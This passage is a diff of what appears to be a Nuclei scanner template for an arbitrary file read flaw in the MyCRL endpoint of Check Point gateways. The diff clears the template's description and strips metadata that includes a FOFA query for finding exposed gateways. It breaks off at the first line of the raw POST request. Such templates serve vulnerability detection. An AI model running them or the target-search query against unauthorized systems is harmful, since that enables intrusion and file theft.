@@ -3,12 +3,8 @@ info:
   name: Check-Point安全网关MyCRL存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cyyr2fggvig1msya'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cyyr2fggvig1msya
-    fofa: body="check point ssl network"
 http:
 - raw:
   - 'POST /clients/MyCRL HTTP/1.1
